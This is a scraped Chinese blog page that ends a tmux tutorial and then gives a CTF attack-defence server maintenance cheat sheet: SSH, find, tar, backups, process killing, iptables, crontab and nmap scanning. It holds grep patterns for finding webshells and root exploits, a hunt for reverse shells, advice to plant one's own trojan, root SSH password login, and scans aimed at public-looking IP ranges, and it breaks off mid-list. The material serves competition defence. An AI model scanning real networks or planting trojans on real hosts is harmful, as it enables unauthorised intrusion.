-<p>可以简单地输入 <code>tmux a</code> 命令，这样可以接入第一个可用的会话：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tmux a</div></pre></td></tr></table></figure>
-<p>或者可以通过参数指定一个想接入的会话：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tmux a -t session-name</div></pre></td></tr></table></figure>
-<h3 id="从会话中断开"><a href="#从会话中断开" class="headerlink" title="从会话中断开"></a>从会话中断开</h3><p>可以使用 <code>detach</code> 命令断开已有的会话（因此才会有稍后重新接入会话这么一说）。</p>
-<p><code>$ tmux detach</code></p>
-<p>也可以使用快捷键断开会话：</p>
-<p><code>$ Ctrl-b d</code></p>
-<h3 id="关闭会话"><a href="#关闭会话" class="headerlink" title="关闭会话"></a>关闭会话</h3><p>要关闭会话的话，可以使用如下的命令，该命令和接入会话时所使用的命令很像：</p>
-<p><code>$ tmux kill-session -t session-name</code></p>
-<p>提示：关闭窗口时也可以使用类似的命令，只不过要把 kill-session 换成 kill-window。另外，还可以使用 tmux killall 同时关闭 tmux。</p>
-<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>与其他工具一样，一旦配置好了 tmux，使用起来就将会非常顺手。下面就给出几个通常需要配置的项目：</p>
-<ul>
-<li>tmux 的主要快捷键</li>
-<li>屏幕下方的状态条</li>
-<li>自定义的各种快捷键</li>
-</ul>
-<p>我使用了一些相当简单的配置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># Set a Ctrl-b shortcut for reloading your tmux config</div><div class="line">#设置 Ctrl-b 快捷键，用于重新加载 tmux 的配置文件</div></pre></td></tr></table></figure>
-<p>access log，error log和system log。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">bind r source-file ~/.tmux.conf</div><div class="line"> </div><div class="line"># Rename your terminals</div><div class="line"># 重命名终端</div><div class="line">set -g set-titles on</div><div class="line">set -g set-titles-string &amp;#039;#(whoami)::#h::#(curl ipecho.net/plain;echo)&amp;#039;</div><div class="line"> </div><div class="line"># Status bar customization</div><div class="line"># 自定义状态条</div><div class="line">set -g status-utf8 on</div><div class="line">set -g status-bg black</div><div class="line">set -g status-fg white</div><div class="line">set -g status-interval 5</div><div class="line">set -g status-left-length 90</div><div class="line">set -g status-right-length 60</div><div class="line">set -g status-left &amp;quot;#[fg=Green]#(whoami)#[fg=white]::#[fg=blue]</div><div class="line">(hostname -s)#[fg=white]::##[fg=yellow]#(curl ipecho.net/plain;echo)&amp;quot;</div><div class="line"> </div><div class="line">set -g status-justify left</div><div class="line">set -g status-right &amp;#039;#[fg=Cyan]#S #[fg=white]%a %d %b %R&amp;#039;</div></pre></td></tr></table></figure>
-<blockquote>
-<p>tmux 默认会先从 <code>/etc/tmux.conf</code> 加载系统级的配置项，然后从 <code>~/.tmux.conf</code> 加载用户级的配置项。也可以使用参数 <code>-f</code> 指定一个配置文件。——译者注</p>
-</blockquote>
-<p>这里有一点值得注意，我使用了 ipecho.net 而不是 icanhazip 来获取计算机当前的 IP 地址（IPv4）。虽然也有很多教程在使用 icanhazip，但是凭我的经验，ipecho.net 的速度更快，更稳定。</p>
-<p>提示：如果你感兴趣，可以来<a href="https://raw.github.com/danielmiessler/tmux/master/.tmux.config" target="_blank" rel="external">这里</a>查看我使用的最新配置。</p>
-<h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><p>我平时常用的功能就是这些了。不过，我也会使用一些 tmux 中更强大的功能。</p>
-<h3 id="窗口和窗格"><a href="#窗口和窗格" class="headerlink" title="窗口和窗格"></a>窗口和窗格</h3><p><img src="/images/2017-12-09/7178f37egw1esoxc7zgryj21670nf7li.jpg" alt="img"></p>
-<p>这些高级功能之一就是 tmux 可以将一个会话分割成若干个称为窗口（Window）和窗格（Pane）的相互分离的组件。这种逻辑上的分割使用户可以轻松安排各种各样的操作。</p>
-<p>下面就来看一看这几个概念之间的关系。</p>
-<h4 id="层次结构"><a href="#层次结构" class="headerlink" title="层次结构"></a>层次结构</h4><p><img src="/images/2017-12-09/7178f37egw1esoxc7hp5oj20gm0bkjs6.jpg" alt="img"></p>
-<p>如上图所示，一个会话（Session）可以包含多个窗口，一个窗口（Window）可以包含多个窗格（Pane）。这就是我对这些概念的简单理解。当然如果诸位有更权威或者更实用的解释，我很乐意洗耳恭听。</p>
-<ul>
-<li>会话适用于分别管理大的工作内容，例如日常工作，实验或是系统管理，都可以分别在一个会话中进行。</li>
-<li>窗口适用于分别管理这些大工作中的项目。例如，在用于实验的会话中可能有一叫做 noderestapi 的窗口用于调试 node REST API，有一个叫做 lua 的窗口用于调试 lua 脚本。</li>
-<li>窗格适用于查看当前的项目。例如，在系统管理的会话中有一个叫做 logs 的窗口，在这个窗口中可以打开多个窗格分别用于查看 access log，error log和system log。</li>
-</ul>
-<p>我们也可以在会话中直接创建窗格，而不需要先创建一个窗口。我有时也会这样做。当阅读完“层次结构”这一小节，希望我的这种做法没有听起来那样恐怖。正如我在一开始谈到的，我更倾向于简化 tmux 的使用。</p>
-<h4 id="在窗格间移动光标"><a href="#在窗格间移动光标" class="headerlink" title="在窗格间移动光标"></a>在窗格间移动光标</h4><p>虽然有默认的在窗格间移动光标的方法，但是我并不清楚是什么。因为我习惯用 vim，所以我会用<code>h</code>，<code>j</code>，<code>k</code> 和 <code>l</code> 键在窗格间移动光标。为此，要加入如下的配置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># Remap window(pane?) navigation to vim</div><div class="line"># 用 vim 的方式在窗格间移动光标</div><div class="line">unbind-key j</div><div class="line">bind-key j select-pane -D</div><div class="line">unbind-key k</div><div class="line">bind-key k select-pane -U</div><div class="line">unbind-key h</div><div class="line">bind-key h select-pane -L</div><div class="line">unbind-key l</div><div class="line">bind-key l select-pane -R</div></pre></td></tr></table></figure>
-<h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a><strong>建议</strong></h2><p>以下几条建议也许会有助于诸位的 tmux 之旅：</p>
-<ol>
-<li>尽可能少打开会话和窗口。人类没有我们自认为的那样善于处理多任务。虽然打开 47 个窗格显得很强大，但是这并没有我们想象的那样实用。</li>
-<li>当确实要使用窗口和窗格时，花一点时间为它们起个有意义的名字。这非常有用，如果只是用 0、1、2 这样的名字，切换会话或窗口时就会非常麻烦。</li>
-<li>从基础的配置、操作开始使用 tmux，别一上来就把自己搞糊涂了。我曾遇到过很多人，他们花费了大量的时间配置 vim 或 tmux，而最终带来的结果却是不但把自己绕进去了，而且项目也没有进展。<h2 id="快捷键参考"><a href="#快捷键参考" class="headerlink" title="快捷键参考"></a>快捷键参考</h2></li>
-</ol>
-<p>按下 <code>Ctrl-b</code> 后的快捷键如下：</p>
-<h3 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h3><ul>
-<li><code>?</code> 获取帮助信息</li>
-</ul>
-<h3 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h3><ul>
-<li><code>s</code> 列出所有会话</li>
-<li><code>$</code> 重命名当前的会话</li>
-<li><code>d</code> 断开当前的会话</li>
-</ul>
-<h3 id="窗口管理"><a href="#窗口管理" class="headerlink" title="窗口管理"></a>窗口管理</h3><ul>
-<li><code>c</code> 创建一个新窗口</li>
-<li><code>,</code> 重命名当前窗口</li>
-<li><code>w</code> 列出所有窗口</li>
-<li><code>%</code> 水平分割窗口</li>
-<li><code>&quot;</code> 竖直分割窗口</li>
-<li><code>n</code> 选择下一个窗口</li>
-<li><code>p</code> 选择上一个窗口</li>
-<li><code>0~9</code> 选择0~9对应的窗口</li>
-</ul>
-<h3 id="窗格管理"><a href="#窗格管理" class="headerlink" title="窗格管理"></a>窗格管理</h3><ul>
-<li><code>%</code> 创建一个水平窗格</li>
-<li><code>&quot;</code> 创建一个竖直窗格</li>
-<li><code>h</code> 将光标移入左侧的窗格*</li>
-<li><code>j</code> 将光标移入下方的窗格*</li>
-<li><code>l</code> 将光标移入右侧的窗格*</li>
-<li><code>k</code> 将光标移入上方的窗格*</li>
-<li><code>q</code> 显示窗格的编号</li>
-<li><code>o</code> 在窗格间切换</li>
-<li><code>}</code> 与下一个窗格交换位置</li>
-<li><code>{</code> 与上一个窗格交换位置</li>
-<li><code>!</code> 在新窗口中显示当前窗格</li>
-<li><code>x</code> 关闭当前窗格&gt; 要使用带“*”的快捷键需要提前配置，配置方法可以参考上文的“在窗格间移动光标”一节。——译者注</li>
-</ul>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h3><ul>
-<li><code>t</code> 在当前窗格显示时间</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/ctf运维的基本操作/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/12/09/ctf运维的基本操作/" itemprop="url">ctf运维的基本操作</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T14:53:50+08:00">
-                2017-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/运维/" itemprop="url" rel="index">
-                    <span itemprop="name">运维</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1、ssh相关操作"><a href="#1、ssh相关操作" class="headerlink" title="1、ssh相关操作"></a>1、ssh相关操作</h3><p>启动ssh（root亦可登录）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">service sshd start</div><div class="line">vi /etc/ssh/sshd_config</div><div class="line">- 取消PasswordAuthentication yes的注释</div><div class="line">- 将#PermitRootLogin prohibit-password后加入一行PermitRootLogin yes</div><div class="line">service sshd restart</div></pre></td></tr></table></figure>
-<p>ssh登录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">xshell登录</div><div class="line">- ssh [user@]host[ port][;host[ port]]</div><div class="line">- ssh root@172.168.12.13 22   //进入界面中设置用户名、密码</div><div class="line">- ssh 172.168.12.13  ;172.168.12.13 22  //console中设置用户名和密码</div><div class="line"></div><div class="line">linux中ssh登录</div><div class="line">- ssh root@172.168.12.13 -p 22</div></pre></td></tr></table></figure>
-<p>ssh文件传输</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">xshell下载（最好是配合Xftp）</div><div class="line"></div><div class="line">命令下载（scp）</div><div class="line">- scp local_file remote_username@remote_ip:remote_folder </div><div class="line">- scp remote_username@remote_ip:remote_file local_file </div><div class="line">- scp -r local_folder remote_username@remote_ip:remote_folder </div><div class="line">- scp -r remote_username@remote_ip:remote_folder local_folder</div></pre></td></tr></table></figure>
-<h3 id="2、vim常用修改"><a href="#2、vim常用修改" class="headerlink" title="2、vim常用修改"></a>2、vim常用修改</h3><h4 id="2-1-影响范围"><a href="#2-1-影响范围" class="headerlink" title="2.1 影响范围"></a>2.1 影响范围</h4><p>当前文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:命令</div></pre></td></tr></table></figure>
-<p>当前用户的文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vim ~/.vimrc</div><div class="line">命令</div></pre></td></tr></table></figure>
-<p>所有用户的文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vim /etc/vim/vimrc</div><div class="line"></div><div class="line">命令</div></pre></td></tr></table></figure>
-<h4 id="2-2-常用命令"><a href="#2-2-常用命令" class="headerlink" title="2.2 常用命令"></a>2.2 常用命令</h4><p>显示行号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set nu或者:set number</div></pre></td></tr></table></figure>
-<p>不显示行号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set nonu 或者:set nonumber</div></pre></td></tr></table></figure>
-<p>设置tab长度</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set tabstop=4</div></pre></td></tr></table></figure>
-<p>设置文件格式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">:set fileformat=unix或者:set ff=unix</div><div class="line">:set fileformat=dos或者:set ff=dos</div></pre></td></tr></table></figure>
-<h3 id="3、find指令"><a href="#3、find指令" class="headerlink" title="3、find指令"></a>3、find指令</h3><p>查找文件类型</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -type f -name *.php</div></pre></td></tr></table></figure>
-<p>查找某种权限的文件及文件夹</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-perm(permission)</div><div class="line">- -perm mode：精确匹配权限</div><div class="line">- -perm -mode：完全包含此mode时才可以匹配</div><div class="line">- -perm +mode：任何一位匹配即可</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">a权限转为2进制后为 000 110 000 000 (0600)</div><div class="line">b权限转为2进制后为 000 010 000 000 (0200)</div><div class="line">c权限转为2进制后为 000 100 000 000 (0400)</div><div class="line">d权限转为2进制后为 000 110 110 000 (0660)</div><div class="line"></div><div class="line">1. 在find . -type f -perm -0600 中的0600权限转为2进制为000 110 000 000,那么0600前的-号代表缺一不可,也就是如果有1的地方必须有1,那么这里找-0600权限的文件,这0600权限里前面有2个位置都是1,所以这里find找-0600权限的文件就是找第4、5位都是1的文件.而只有a d这两个文件前2个位置都是1,所以find . -type f -perm -0600 只会找到a d两个文件.</div><div class="line">2. find . -type f -perm +0600会找到a b c d这4个文件,这是因为: </div><div class="line">   +0600 里的这个+号代表有1即可,也就是有1的位置，任何位置只要有1就可以.那么这里找+0600权限的文件,这0600权限第4、5位都有1,所以这里find 找+0600权限的文件就是找第4、5位只要有一个位置有1的文件就可以了,这4个文件都符合要求所以最后都能被 find . -type f -perm +0600找到</div></pre></td></tr></table></figure>
-<p>多种条件并列查找</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">find / -type f  -perm -04000 -o -perm -02000		// 或关系</div><div class="line"></div><div class="line">find / -type f  -perm -04000 -a -perm -02000		// 与关系</div></pre></td></tr></table></figure>
-<p>查找符合某些特征的文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># 找php木马</div><div class="line">find / -type f -name *.php | xargs egrep -l &quot;mysql_query\($query, $dbconn\)|专用网马|udf.dll|class PHPzip\&#123;|ZIP压缩程序 荒野无灯修改版|$writabledb|AnonymousUserName|eval\(|Root_CSS\(\)|黑狼PHP木马|eval\(gzuncompress\(base64_decode|if\(empty\($_SESSION|$shellname|$work_dir |PHP木马|Array\(&quot;$filename&quot;| eval\($_POST\[|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|提权|phpspy|后门&quot;</div><div class="line"></div><div class="line"># 找jsp木马</div><div class="line">find / -type f -name *.jsp | xargs egrep -l &quot;InputStreamReader\(this.is\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|提权|jspspy|后门&quot;</div><div class="line"></div><div class="line"># 找HTML恶意代码</div><div class="line">find / -type f -name *.html | xargs egrep -l &quot;WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330&quot;</div><div class="line"></div><div class="line"># 找perl恶意程序</div><div class="line">find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot;</div><div class="line"></div><div class="line"># 找python恶意程序</div><div class="line">find / -type f -name *.py | xargs egrep -l &quot;execCmd|cat /etc/issue|getAppProc|exploitdb&quot;</div><div class="line"></div><div class="line"># 检查系统是否存在恶意程序</div><div class="line">find / -type f -perm -111  |xargs egrep &quot;UpdateProcessER12CUpdateGatesE6C|CmdMsg\.cpp|MiniHttpHelper.cpp|y4&apos;r3 1uCky k1d\!|execve@@GLIBC_2.0|initfini.c|ptmalloc_unlock_all2|_IO_wide_data_2|system@@GLIBC_2.0|socket@@GLIBC_2.0|gettimeofday@@GLIBC_2.0|execl@@GLIBC_2.2.5|WwW.SoQoR.NeT|2.6.17-2.6.24.1.c|Local Root Exploit|close@@GLIBC_2.0|syscall\(\__NR\_vmsplice,|Linux vmsplice Local Root Exploit|It looks like the exploit failed|getting root shell&quot; 2&gt;/dev/null</div></pre></td></tr></table></figure>
-<h3 id="4、tar指令"><a href="#4、tar指令" class="headerlink" title="4、tar指令"></a>4、tar指令</h3><p>打包文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar zcvf /tmp/www.tgz /var/www/html</div></pre></td></tr></table></figure>
-<p>解压文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar zxvf /tmp/www.tgz -C /tmp/</div></pre></td></tr></table></figure>
-<p>不同类型的压缩文件相关参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1、*.tar 用 tar –xvf 解压</div><div class="line">2、*.gz 用 gzip -d或者gunzip 解压</div><div class="line">3、.tar.gz和.tgz 用 tar –xzf 解压</div><div class="line">4、*.bz2 用 bzip2 -d或者用bunzip2 解压</div><div class="line">5、*.tar.bz2用tar –xjf 解压</div><div class="line">6、*.Z 用 uncompress 解压</div><div class="line">7、*.tar.Z 用tar –xZf 解压</div><div class="line">8、*.rar 用 unrar e解压</div><div class="line">9、*.zip 用 unzip 解压</div></pre></td></tr></table></figure>
-<h3 id="5、备份"><a href="#5、备份" class="headerlink" title="5、备份"></a>5、备份</h3><p>网站备份</p>
-<blockquote>
-<p>利用上述tar命令将文件进行打包备份</p>
-</blockquote>
-<p>sql备份</p>
-<blockquote>
-<p>sql备份需要相关工作者，分析网站系统，并得到sql服务器密码，通过相应指令进行备份。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">备份数据库</div><div class="line">- mysqldump -u 用户名 -p 密码 数据库名 &gt; bak.sql</div><div class="line">- mysqldump --all-databases &gt; bak.sql</div><div class="line"></div><div class="line">还原数据库</div><div class="line">- mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql</div></pre></td></tr></table></figure>
-<h3 id="6、杀死进程"><a href="#6、杀死进程" class="headerlink" title="6、杀死进程"></a>6、杀死进程</h3><p>web服务进程分两种，一种是运维者的进程，一种为攻击者的进程。攻击者的进程一般是恶意进程，而且运维者并没有权限杀死改进程。为了杀死这些www-data用户的进程，我们应该在服务器上挂个马，然后通过网络访问的方式删除木马、杀死僵尸进程等。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">用户用ssh偷偷连接web服务器</div><div class="line">- w</div><div class="line">- pkill -kill -t &lt;用户tty&gt;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">查看所有的进程</div><div class="line">- ps aux</div><div class="line">- ps -ef</div><div class="line"></div><div class="line">查看某个用户的进程</div><div class="line">- ps -f -u www-data</div><div class="line"></div><div class="line">查看已建立的网络连接及进程</div><div class="line">- netstat -antulp | grep EST</div><div class="line"></div><div class="line">查看指定端口被那个进程占用</div><div class="line">- lsof -i:端口号</div><div class="line">- netstat -tunlp|grep 端口号</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">结束进程</div><div class="line">- kill PID		  // 只能是PID</div><div class="line">- killall &lt;进程名&gt;  // 只能是进程名</div><div class="line">- kill -9 PID          // 此处的9是signal，代表SIGKILL</div><div class="line">- killall -u www-data   //杀死www-data的所有进程</div><div class="line"></div><div class="line">找反弹的shell进程</div><div class="line">ps aux|grep &quot;bash -i&quot;</div></pre></td></tr></table></figure>
-<h3 id="7、iptables设置"><a href="#7、iptables设置" class="headerlink" title="7、iptables设置"></a>7、iptables设置</h3><p>其实主办方一般不会给iptables的相关权限，毕竟给了这个权限之后就没法玩了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#Allow youself Ping other hosts , prohibit others Ping you</div><div class="line">iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP</div><div class="line">iptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT</div><div class="line"></div><div class="line">#Close all INPUT FORWARD OUTPUT, just open some ports</div><div class="line">iptables -P INPUT DROP</div><div class="line">iptables -P FORWARD DROP</div><div class="line">iptables -P OUTPUT DROP</div><div class="line"></div><div class="line">#Open ssh</div><div class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</div><div class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</div><div class="line"></div><div class="line">#ip prohibit</div><div class="line">iptables -A INPUT -p tcp --dport 80 -s 172.16.0.86 -j DROP</div></pre></td></tr></table></figure>
-<h3 id="8、crontab设置"><a href="#8、crontab设置" class="headerlink" title="8、crontab设置"></a>8、crontab设置</h3><p>作为维护者，为了方便自己定时检查数据内容，我们可以写个程序，利用crontab定时检查！</p>
-<p>作为攻击者，为了让维护者无法完全杀死自己，其可以起一个crontab定时程序，让服务器定时反弹shell或者执行木马程序。</p>
-<p>关于crontab的使用，可以参见以前的博文 <a href="/2017/11/26/crontab指令介绍/">crontab指令介绍</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">显示某个用户的crontab文件内容</div><div class="line">crontab -l -u user</div><div class="line"></div><div class="line">删除crontab内容</div><div class="line">crontab -r -u user</div></pre></td></tr></table></figure>
-<h3 id="9、挂waf的相关操作"><a href="#9、挂waf的相关操作" class="headerlink" title="9、挂waf的相关操作"></a>9、挂waf的相关操作</h3><p>一般情况下，系统不会立马被人攻陷，所以运维者至少有10分钟的时间可以维护主机。那么这段时间应该做些什么？</p>
-<blockquote>
-<p>首先将网站备份，并上传waf、file_check等必要工具；</p>
-<p>然后挂上waf。将waf放置到/tmp目录下，并给waf、waf/log/、waf/log_all/ 以及相应的文件777权限，然后配置好setup.py、waf.php，最后执行python setup.py；</p>
-<p>其次就是启动file_check程序。将file_check放置到/tmp目录下，配置file_check.py，执行python file_check.p；;</p>
-<p>最后将sql备份(不一定是必须的，因为sql不一定有。之所以将其放置到最后，是因为从代码中l找到sql密码较为耗时间！)，并将网站备份、sql备份下载至本地。</p>
-</blockquote>
-<h3 id="10、扫描网络"><a href="#10、扫描网络" class="headerlink" title="10、扫描网络"></a>10、扫描网络</h3><p>扫描网络在闲暇比赛中其实很重要。首先，你需要将目标网段确定，一般就是一个/24的网段，可能存在的服务器不会超过256台。但是，仅仅这个数量其实也挺多的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">#扫描指定端口</div><div class="line">nmap -n --open -p 80 X.X.X.X/24</div><div class="line"></div><div class="line">#扫描指定网段的远程桌面连接端口</div><div class="line">nmap -sT -p3389 218.206.112.0/24</div><div class="line"></div><div class="line">#使用nmap来扫描端口UDP</div><div class="line">nmap -sU 202.96.128.86 -p 53 -Pn</div><div class="line"></div><div class="line">#进行安全检测(全端口扫描)</div><div class="line">nmap -v -A 219.129.216.156</div><div class="line"></div><div class="line">#仅列出指定网络上的每台主机，不发送任何报文到目标主机（能够得到相应的域名）</div><div class="line">nmap -sL 192.168.1.0/24</div><div class="line"></div><div class="line">#探测目标主机开放的端口，可以指定一个以逗号分隔的端口列表(如-PS22，23，25，80)</div><div class="line">nmap -PS 192.168.1.234 </div><div class="line"></div><div class="line">#使用UDP ping探测主机</div><div class="line">nmap -PU 192.168.1.0/24</div><div class="line"></div><div class="line">#使用频率最高的扫描选项：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快</div><div class="line">nmap -sS 192.168.1.0/24 </div><div class="line"></div><div class="line">#当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描</div><div class="line">nmap -sT 192.168.1.0/24 </div><div class="line"></div><div class="line">#UDP扫描用-sU选项,UDP扫描发送空的(没有数据)UDP报头到每个目标端口</div><div 